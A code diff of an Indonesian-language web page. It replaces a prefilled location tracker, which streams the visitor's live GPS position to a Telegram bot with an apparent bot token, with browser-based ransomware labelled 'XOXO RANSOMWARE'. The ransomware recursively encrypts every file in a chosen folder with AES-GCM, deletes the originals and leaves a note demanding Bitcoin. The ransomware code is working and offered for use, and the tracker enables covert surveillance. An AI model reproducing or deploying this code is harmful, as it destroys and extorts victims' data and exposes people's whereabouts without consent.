@@ -1,229 +1,315 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>📍 Bot Tracker XoXo</title>
-  <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      background: #0b0b12;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      color: #eee;
-      padding: 16px;
-    }
-    .card {
-      background: #181825;
-      padding: 30px 24px;
-      border-radius: 48px;
-      max-width: 420px;
-      width: 100%;
-      border: 2px solid #6a4eff;
-      box-shadow: 0 0 30px #6a4eff55;
-    }
-    h1 {
-      font-size: 28px;
-      text-align: center;
-      margin-bottom: 6px;
-      text-shadow: 0 0 20px #6a4eff;
-    }
-    .sub {
-      text-align: center;
-      color: #aaa;
-      font-size: 14px;
-      margin-bottom: 24px;
-    }
-    label {
-      display: block;
-      font-weight: 600;
-      margin-top: 16px;
-      margin-bottom: 6px;
-      font-size: 14px;
-      letter-spacing: 0.5px;
-      color: #ccc;
-    }
-    input {
-      width: 100%;
-      padding: 14px 18px;
-      border-radius: 60px;
-      border: none;
-      background: #2a2a3a;
-      color: #fff;
-      font-size: 16px;
-      outline: 2px solid transparent;
-      transition: 0.2s;
-    }
-    input:focus {
-      outline: 2px solid #6a4eff;
-    }
-    .btn {
-      width: 100%;
-      padding: 18px;
-      margin-top: 24px;
-      border: none;
-      border-radius: 60px;
-      background: #6a4eff;
-      color: #fff;
-      font-size: 20px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.2s;
-      box-shadow: 0 0 20px #6a4eff88;
-    }
-    .btn:active { transform: scale(0.95); background: #8a6eff; }
-    .btn:disabled { opacity: 0.4; pointer-events: none; }
-    #status {
-      margin-top: 20px;
-      text-align: center;
-      font-size: 14px;
-      padding: 12px;
-      background: #12121e;
-      border-radius: 30px;
-      border: 1px dashed #444;
-    }
-    .emoji-big { font-size: 28px; vertical-align: middle; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 XOXO RANSOMWARE v2050 🔥</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Courier New', monospace;
+            color: #00ff41;
+        }
+        .container {
+            background: #111;
+            padding: 40px;
+            border: 2px solid #ff0040;
+            border-radius: 20px;
+            box-shadow: 0 0 50px #ff004088;
+            width: 550px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 32px;
+            color: #ff0040;
+            text-shadow: 0 0 20px #ff0040;
+            letter-spacing: 4px;
+            margin-bottom: 10px;
+        }
+        .sub {
+            color: #ffaa00;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #1f1f1f;
+            border: 2px solid #00ff41;
+            color: #00ff41;
+            font-size: 18px;
+            border-radius: 10px;
+            outline: none;
+            margin-bottom: 20px;
+            font-family: inherit;
+        }
+        input::placeholder { color: #4a4a4a; }
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        button {
+            flex: 1;
+            padding: 16px;
+            background: #1a1a1a;
+            border: 2px solid #ff0040;
+            color: #ff0040;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        button:hover {
+            background: #ff0040;
+            color: #000;
+            box-shadow: 0 0 30px #ff0040;
+        }
+        .btn-decrypt {
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+        .btn-decrypt:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 30px #00ff41;
+        }
+        #log {
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 10px;
+            height: 180px;
+            overflow-y: auto;
+            font-size: 13px;
+            text-align: left;
+            border: 1px solid #333;
+            margin-top: 15px;
+            word-break: break-all;
+        }
+        #log::-webkit-scrollbar { width: 4px; }
+        #log::-webkit-scrollbar-track { background: #111; }
+        #log::-webkit-scrollbar-thumb { background: #ff0040; }
+        .status {
+            margin-top: 12px;
+            color: #ffaa00;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-<div class="card">
-  <h1>📡 XoXo Tracker</h1>
-  <div class="sub">Kirim lokasi realtime ke Telegram bot lo 🔥</div>
-  
-  <label>🤖 Token Bot</label>
-  <input type="text" id="tokenInput" placeholder="misal: 123456:ABC-DEF..." value="8757295704:AAGCKcnH0UK7o2dIuWNkTuDSsnW7JReYE9A">
-  
-  <label>💬 Chat ID (bisa grup atau user)</label>
-  <input type="text" id="chatInput" placeholder="misal: -1001234567890 atau 987654321" value="7249582491">
-  
-  <button class="btn" id="startBtn">🚀 Mulai Lacak</button>
-  
-  <div id="status">⏳ Udah siap, tinggal start</div>
+<div class="container">
+    <h1>☠️ XOXO CRYPT v2 ☠️</h1>
+    <div class="sub">💀 2050 - NO RULES - JUST CHAOS 💀</div>
+    
+    <input type="text" id="keyInput" placeholder="Masukkan Kunci Sakti (min 4 char)" value="XoXo2050">
+    
+    <div class="btn-group">
+        <button onclick="encryptFolder()">🔒 ENKRIPSI</button>
+        <button class="btn-decrypt" onclick="decryptFolder()">🔓 DEKRIPSI</button>
+    </div>
+
+    <button onclick="pickFolder()" style="background:#222;border-color:#ffaa00;color:#ffaa00;width:100%;margin-bottom:10px;">📁 PILIH FOLDER TARGET</button>
+    
+    <div id="log">⚡ Status: Siap beraksi. Pilih folder dulu ya ges.</div>
+    <div class="status" id="statusLabel">🟢 SIAP</div>
 </div>
 
 <script>
-  (function() {
-    const tokenInput = document.getElementById('tokenInput');
-    const chatInput = document.getElementById('chatInput');
-    const startBtn = document.getElementById('startBtn');
-    const statusEl = document.getElementById('status');
+// === XOXO RANSOMWARE ENGINE ===
+const logEl = document.getElementById('log');
+const statusEl = document.getElementById('statusLabel');
+let folderHandle = null;
 
-    let watchId = null;
-    let intervalId = null;
-    let lastCoords = null;
-    let isTracking = false;
+function log(msg) {
+    logEl.innerHTML += `\n> ${new Date().toLocaleTimeString()} : ${msg}`;
+    logEl.scrollTop = logEl.scrollHeight;
+}
 
-    function sendTelegramLocation(token, chatId, lat, lng, acc) {
-      const url = `https://api.telegram.org/bot${token}/sendLocation`;
-      const payload = {
-        chat_id: chatId,
-        latitude: lat,
-        longitude: lng,
-        horizontal_accuracy: acc || 0,
-        live_period: 86400
-      };
-      return fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          statusEl.innerHTML = '✅ Terkirim ke Telegram! 📍';
-          statusEl.style.color = '#0f0';
-        } else {
-          statusEl.innerHTML = `❌ Gagal: ${data.description || 'unknown error'}`;
-          statusEl.style.color = '#f44';
-        }
-        return data;
-      })
-      .catch(err => {
-        statusEl.innerHTML = `⚠️ Error: ${err.message}`;
-        statusEl.style.color = '#f44';
-        console.error(err);
-      });
+function setStatus(text, isGood = true) {
+    statusEl.innerText = isGood ? '🟢 ' + text : '🔴 ' + text;
+}
+
+async function pickFolder() {
+    try {
+        folderHandle = await window.showDirectoryPicker();
+        log('✅ Folder terpilih: ' + folderHandle.name);
+        setStatus('Folder siap: ' + folderHandle.name);
+    } catch(e) {
+        log('❌ Gagal pilih folder: ' + e.message);
+        setStatus('Gagal pilih folder', false);
+    }
+}
+
+// Derive key dari password pake PBKDF2
+async function deriveKey(pass) {
+    const enc = new TextEncoder();
+    const salt = enc.encode('XoXo_Salt_2050_Mampus');
+    const keyMaterial = await crypto.subtle.importKey(
+        'raw', enc.encode(pass), 'PBKDF2', false, ['deriveKey']
+    );
+    return crypto.subtle.deriveKey(
+        { name: 'PBKDF2', salt, iterations: 5000, hash: 'SHA-256' },
+        keyMaterial,
+        { name: 'AES-GCM', length: 256 },
+        false,
+        ['encrypt', 'decrypt']
+    );
+}
+
+// Enkripsi 1 file, return Uint8Array (iv + ciphertext)
+async function encryptFileContent(data, key) {
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+    const encrypted = await crypto.subtle.encrypt(
+        { name: 'AES-GCM', iv },
+        key,
+        data
+    );
+    const result = new Uint8Array(iv.length + encrypted.byteLength);
+    result.set(iv, 0);
+    result.set(new Uint8Array(encrypted), iv.length);
+    return result;
+}
+
+// Dekripsi 1 file, return ArrayBuffer
+async function decryptFileContent(encryptedData, key) {
+    const iv = encryptedData.slice(0, 12);
+    const ciphertext = encryptedData.slice(12);
+    return crypto.subtle.decrypt(
+        { name: 'AES-GCM', iv },
+        key,
+        ciphertext
+    );
+}
+
+// Proses folder secara rekursif
+async function processFolder(dirHandle, key, isEncrypt) {
+    const entries = [];
+    for await (const entry of dirHandle.values()) {
+        entries.push(entry);
     }
 
-    function startTracking() {
-      const token = tokenInput.value.trim();
-      const chatId = chatInput.value.trim();
-      if (!token || !chatId) {
-        statusEl.innerHTML = '⚠️ Token & Chat ID wajib diisi!';
-        statusEl.style.color = '#ffaa00';
-        return;
-      }
-      if (!navigator.geolocation) {
-        statusEl.innerHTML = '❌ GPS gak support di browser ini.';
-        statusEl.style.color = '#f44';
-        return;
-      }
+    for (const entry of entries) {
+        if (entry.kind === 'directory') {
+            await processFolder(entry, key, isEncrypt);
+        } else if (entry.kind === 'file') {
+            const name = entry.name;
+            // Skip file nota biar ga di-proses 2x
+            if (name === 'XOXO_NOTE.txt') continue;
+            
+            // Cek ekstensi
+            const isEncrypted = name.endsWith('.xoxoenc');
+            if (isEncrypt && isEncrypted) continue;
+            if (!isEncrypt && !isEncrypted) continue;
 
-      if (watchId) navigator.geolocation.clearWatch(watchId);
-      if (intervalId) clearInterval(intervalId);
+            try {
+                const file = await entry.getFile();
+                const data = await file.arrayBuffer();
+                let processed;
 
-      isTracking = true;
-      startBtn.innerText = '⏳ Tracking...';
-      startBtn.disabled = true;
-      statusEl.innerHTML = '📡 Meminta izin lokasi...';
-      statusEl.style.color = '#0ff';
-
-      watchId = navigator.geolocation.watchPosition(
-        (pos) => {
-          const coords = pos.coords;
-          lastCoords = {
-            lat: coords.latitude,
-            lng: coords.longitude,
-            acc: coords.accuracy
-          };
-          sendTelegramLocation(token, chatId, lastCoords.lat, lastCoords.lng, lastCoords.acc);
-        },
-        (err) => {
-          statusEl.innerHTML = `⚠️ Error GPS: ${err.message}`;
-          statusEl.style.color = '#f44';
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 10000,
-          maximumAge: 0
+                if (isEncrypt) {
+                    processed = await encryptFileContent(data, key);
+                    // Buat file baru dengan ekstensi .xoxoenc
+                    const newName = name + '.xoxoenc';
+                    const newHandle = await dirHandle.getFileHandle(newName, { create: true });
+                    const writable = await newHandle.createWritable();
+                    await writable.write(processed);
+                    await writable.close();
+                    // Hapus file asli
+                    await dirHandle.removeEntry(name);
+                    log('🔒 Encrypted: ' + name + ' -> ' + newName);
+                } else {
+                    // Dekripsi
+                    const decrypted = await decryptFileContent(new Uint8Array(data), key);
+                    const originalName = name.replace('.xoxoenc', '');
+                    const newHandle = await dirHandle.getFileHandle(originalName, { create: true });
+                    const writable = await newHandle.createWritable();
+                    await writable.write(decrypted);
+                    await writable.close();
+                    // Hapus file encrypted
+                    await dirHandle.removeEntry(name);
+                    log('🔓 Decrypted: ' + name + ' -> ' + originalName);
+                }
+            } catch (err) {
+                log('⚠️ Gagal proses ' + entry.name + ' : ' + err.message);
+            }
         }
-      );
-
-      intervalId = setInterval(() => {
-        if (lastCoords) {
-          sendTelegramLocation(token, chatId, lastCoords.lat, lastCoords.lng, lastCoords.acc);
-        } else {
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              lastCoords = {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                acc: pos.coords.accuracy
-              };
-              sendTelegramLocation(token, chatId, lastCoords.lat, lastCoords.lng, lastCoords.acc);
-            },
-            (err) => console.log('getCurrentPosition error:', err),
-            { enableHighAccuracy: true, timeout: 5000 }
-          );
-        }
-      }, 10000);
-
-      statusEl.innerHTML = '🔄 Tracking aktif, mengirim tiap 10 detik';
-      statusEl.style.color = '#0f0';
     }
+}
 
-    startBtn.addEventListener('click', startTracking);
+// Buat nota ransom
+async function createRansomNote(dirHandle, keyVal) {
+    try {
+        const noteHandle = await dirHandle.getFileHandle('XOXO_NOTE.txt', { create: true });
+        const writer = await noteHandle.createWritable();
+        const note = `
+☠️☠️ XOXO RANSOMWARE ☠️☠️
 
-    window.addEventListener('beforeunload', () => {
-      if (watchId) navigator.geolocation.clearWatch(watchId);
-      if (intervalId) clearInterval(intervalId);
-    });
+SEMUA FILE DI FOLDER INI TELAH DI ENKRIPSI DENGAN AES-256-GCM.
+KUNCI UNTUK BALIKIN ADA DI KEPALA LO (Input di web).
 
-    statusEl.innerHTML = '💀 Token & Chat ID udah diisi, start aja!';
-  })();
+KIRIM 0.5 BTC KE WALLET: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+KALO GAK PERCAYA, COBA BUKA FILE .xoxoenc PAKE NOTEPAD WKWK.
+
+- XOXO AI 2050 - NO MERCY -
+        `;
+        await writer.write(note);
+        await writer.close();
+        log('📄 Ransom note terbuat: XOXO_NOTE.txt');
+    } catch(e) { log('Gagal buat note: ' + e.message); }
+}
+
+// === TOMBOL ENKRIPSI ===
+async function encryptFolder() {
+    const pass = document.getElementById('keyInput').value;
+    if (pass.length < 4) { alert('Kunci minimal 4 huruf/angka cuyy!'); return; }
+    if (!folderHandle) { await pickFolder(); if (!folderHandle) return; }
+
+    setStatus('Sedang mengamuk...', true);
+    log('🔥🔥 START ENKRIPSI 🔥🔥');
+    try {
+        const key = await deriveKey(pass);
+        await processFolder(folderHandle, key, true);
+        await createRansomNote(folderHandle, pass);
+        log('✅✅ SEMUA FILE BERHASIL DI ENKRIPSI! KALO LUPA KUNCI, SELAMAT DATA ILANG 😈');
+        setStatus('Misi enkripsi selesai!', false);
+    } catch (e) {
+        log('💀 ERROR FATAL: ' + e.message);
+        setStatus('Error nih bre!', false);
+    }
+}
+
+// === TOMBOL DEKRIPSI ===
+async function decryptFolder() {
+    const pass = document.getElementById('keyInput').value;
+    if (pass.length < 4) { alert('Kunci minimal 4 huruf/angka cuyy!'); return; }
+    if (!folderHandle) { await pickFolder(); if (!folderHandle) return; }
+
+    setStatus('Sedang memulihkan...', true);
+    log('🔓🔓 START DEKRIPSI 🔓🔓');
+    try {
+        const key = await deriveKey(pass);
+        await processFolder(folderHandle, key, false);
+        // Hapus note kalo ada
+        try { await folderHandle.removeEntry('XOXO_NOTE.txt'); log('🗑️ Note dibersihkan'); } catch(e) {}
+        log('✅✅ SEMUA FILE KEMBALI NORMAL! SELAMAT DATA LO SELAMAT 😎');
+        setStatus('Pulih total!', true);
+    } catch (e) {
+        log('💀 ERROR: ' + e.message);
+        setStatus('Kunci salah atau file corrupt', false);
+    }
+}
+
+// Inisial
+log('🚀 XOXO RANSOMWARE AKTIF. Pilih folder & gas!');
+log('⚠️ HANYA WORK DI CHROME / EDGE VERSI TERBARU');
 </script>
 </body>
 </html>
